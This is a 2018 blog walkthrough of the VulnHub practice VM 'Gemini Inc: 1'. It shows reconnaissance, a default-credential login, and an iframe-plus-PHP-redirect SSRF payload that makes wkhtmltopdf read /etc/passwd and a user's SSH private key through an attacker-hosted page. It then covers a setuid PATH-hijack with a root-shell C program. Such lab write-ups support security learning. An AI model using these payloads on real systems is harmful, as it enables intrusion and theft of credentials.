---
layout: post
date: 2018-05-20 17:53:34 +0000
last_modified_at: 2018-08-03 17:50:17 +0000
title: "Gemini Inc: 1 Walkthrough"
subtitle: "Good Things Come in Pairs"
category: Walkthrough
tags: [VulnHub, "Gemini Inc"]
comments: true
image:
  feature: gemini-inc-1-walkthrough.jpg
  credit: Alexas_Fotos / Pixabay
  creditlink: https://pixabay.com/en/couch-potatoes-funny-potatoes-3116580/
---

This post documents the complete walkthrough of Gemini Inc: 1, a boot2root [VM][1] created by [9emin1][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background
**Gemini Inc** contacted you to perform a penetration testing on one of their internal servers. The server has a web application for employees to export their profile to a PDF. Identify any possible vulnerabilities with the goal of complete server compromise with `root` privilege. Provide the content of `flag.txt` located in the `root` directory as proof.

### Information Gathering

Let's kick this off with a `nmap` scan to establish the available services in the host.

```
nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.10.130
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey:
|   2048 e9:e3:89:b6:3b:ea:e4:13:c8:ac:38:44:d6:ea:c0:e4 (RSA)
|_  256 8c:19:77:fd:36:72:7e:34:46:c4:29:2d:2a:ac:15:98 (ECDSA)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.25
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2018-01-07 08:35  test2/
|_
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Index of /
```
`nmap` finds `22/tcp` and `80/tcp` open. The document root lists one directory `test2` and this is how the site looks like in my browser.

![0.apvno5q230d](/assets/images/posts/gemini-inc-1-walkthrough/0.apvno5q230d.png)

There's no need to fuzz the site for directories and/or files because the landing page has offered an important piece of information about the web application—it's built on [Master Login System](https://github.com/ionutvmi/master-login-system).

### Master Login System

If you'd watched the walkthrough [video](http://www.youtube.com/watch?v=y7SdQfZfLbA) at the project page, you'd have gotten the default login credential without resorting to any brute-force attack; and it's valid too.

![0.m8px4kc89u](/assets/images/posts/gemini-inc-1-walkthrough/0.m8px4kc89u.png)

The drop-down action is available after logging in as `admin` with credential (`admin:1234`).

![0.gpd2zei0wfm](/assets/images/posts/gemini-inc-1-walkthrough/0.gpd2zei0wfm.png)

Here's the `admin`'s profile page.

![0.cnnezs22awr](/assets/images/posts/gemini-inc-1-walkthrough/0.cnnezs22awr.png)

Here's the `admin`'s profile page in PDF.

![0.htaf69v3tiu](/assets/images/posts/gemini-inc-1-walkthrough/0.htaf69v3tiu.png)

I discover that I can access both the profile and export page without having to log in. This means that the export page (`export.php`) probably hardcoded the profile page (`profile.php?u=1`) for PDF conversion. Another interesting fact—`export.php` uses `wkhtmltopdf` for PDF conversion.

![0.h6tdka9vftf](/assets/images/posts/gemini-inc-1-walkthrough/0.h6tdka9vftf.png)

I also discover that **Display name** and **Email** are not validated in the user's profile edit page (`user.php`). You can verify this from the source code of `user.php`.

```php
$email = $_POST['email'];
$display_name = $_POST['display_name'];
.
.
.
if(!isset($page->error) && $db->query("UPDATE `".MLS_PREFIX."users` SET `email` = ?s, `display_name` = ?s ?p WHERE `userid` = ?i", $email, $display_name, $extra, $u->userid))
```

This opens up the web application to vulnerabilities, such as cross-site scripting (XSS), `iframe` injection and server side request forgery (SSRF). And you know what's the best part? It's reflected on the profile page (`profile.php?u=1`) and by extension, the export page (`export.php`).

Simple XSS test.

![0.hp6nrhy7b4d](/assets/images/posts/gemini-inc-1-walkthrough/0.hp6nrhy7b4d.png)

XSS'd.

![0.mvqpaa9wm5n](/assets/images/posts/gemini-inc-1-walkthrough/0.mvqpaa9wm5n.png)

### Issue #3570

SSRF refers to an attack where an attacker is able to send a crafted request to trick a vulnerable web application to perform an unanticipated action.

In this case, we'd like to trick the web application to read local files such as `/etc/passwd` that we weren't able to, expose through PDF using `wkhtmltopdf`.

After scouring through the issues in the `wkhtmltopdf` GitHub project, I found issue [#3570](https://github.com/wkhtmltopdf/wkhtmltopdf/issues/3570)—_SSRF and file read with `wkhtmltoimage`_. In another stroke of luck, I found this [page](https://github.com/crackatoa/kertasgorengan/blob/master/catatan/SSRF%20wkhtml.md) (by googling for "wkhtmltoimage ssrf") that shows you how to exploit issue #3570. Although parts of the page were in Indonesian, the idea was so clear, it doesn't require translation. :wink:

It goes like this—`wkhtmltopdf` follows 302 redirection, captures the HTML, and turns it to PDF.

All we've to do is to host the following code as `1.php` in our attacking machine.

```php
<?php
     $file = $_GET['f'];
     header("location:file://$file");
?>
```

And put this in one of the injectable fields, e.g. **Display name**.

```html
<iframe src="http://192.168.10.128/1.php?f=/etc/passwd" width="100%" height=1220></iframe>
```

Simple? Let's give it a shot.

![0.k9d8bpti9sc](/assets/images/posts/gemini-inc-1-walkthrough/0.k9d8bpti9sc.png)

Sweet. But how do we proceed from here? We can try brute-force attack on `gemini1`'s password. A more efficient way is to read SSH related files off the victim, such as `authorized_keys` and `id_rsa`.

![0.gopakn5k5v](/assets/images/posts/gemini-inc-1-walkthrough/0.gopakn5k5v.png)

There you have it—`/home/gemini1/.ssh/authorized_keys`. This is `gemini1`'s public key. I bet the private key (`id_rsa`) is in there as well.

![0.yb88plfehc](/assets/images/posts/gemini-inc-1-walkthrough/0.yb88plfehc.png)

Awesome. We can now copy and paste the private key to our attacking machine and log in to `gemini1`'s SSH account.

### Low-privilege Shell

![0.9mfp03dho49](/assets/images/posts/gemini-inc-1-walkthrough/0.9mfp03dho49.png)

Not too shabby.

### Privilege Escalation

One of my favorite privilege escalation techniques is to target files `setuid` to `root`. If there's a way to exploit such a file, we can become `root`.

Let's look for such files.

![0.kqoy3f6mn9](/assets/images/posts/gemini-inc-1-walkthrough/0.kqoy3f6mn9.png)

Notice how the modification date/time of `listinfo` stands out from the rest?

Let's run `listinfo` and see what's the output.

![0.nbdfd9161of](/assets/images/posts/gemini-inc-1-walkthrough/0.nbdfd9161of.png)

From what I can make of it, it appears to be the output of `ifconfig`, `netstat` and current date.

Let's look for strings in `listinfo`.

![0.pxqngjycg8](/assets/images/posts/gemini-inc-1-walkthrough/0.pxqngjycg8.png)

It's evident the output of `listinfo` is the result of running the commands highlighted above.

Now, notice that `date` has no full path? If we change the search path `$PATH` and upload a malicious `date`, one that spawns a shell, then running `listinfo` escalates our privileges to `root`.

The following C code `date.c` allows us to `setuid` and `setgid` as `root`, and spawn a shell.

```c
#include <sys/types.h>
#include <unistd.h>
#include <stdlib.h>

int main() {
	setuid(0);
	setgid(0);
	system("/bin/bash");
}
```

First, we use `scp` to upload the malicious `date.c` to `gemini1`'s home directory from our machine.

```
# scp -i /root/keys/gemini1 date.c gemini1@192.168.10.130:/home/gemini1
```

Next, we compile it.

```
$ gcc -o date date.c
```

![0.mrkt9jfxbkj](/assets/images/posts/gemini-inc-1-walkthrough/0.mrkt9jfxbkj.png)

Lastly, we alter the search path `$PATH` in `gemini1`'s shell such that invoking `date` will run the malicious `date` instead.

```
$ export PATH=/home/gemini1:$PATH
```

![0.bwl7cy99wn8](/assets/images/posts/gemini-inc-1-walkthrough/0.bwl7cy99wn8.png)

Running `listinfo` gives us this.

![0.zybux538spi](/assets/images/posts/gemini-inc-1-walkthrough/0.zybux538spi.png)

The pesky output from `listinfo` is still there. Let's do what I always do: generate the SSH key pair I control, upload the public key to `/root/.ssh/authorized_keys`, and log in with the private key.

![0.kubd74dnyo](/assets/images/posts/gemini-inc-1-walkthrough/0.kubd74dnyo.png)

:dancer:

### Afterthought

I learned a great deal about SSRF from this VM.

[1]: https://www.vulnhub.com/entry/gemini-inc-1,227/
[2]: https://twitter.com/@sec_9emin1
[3]: https://www.vulnhub.com
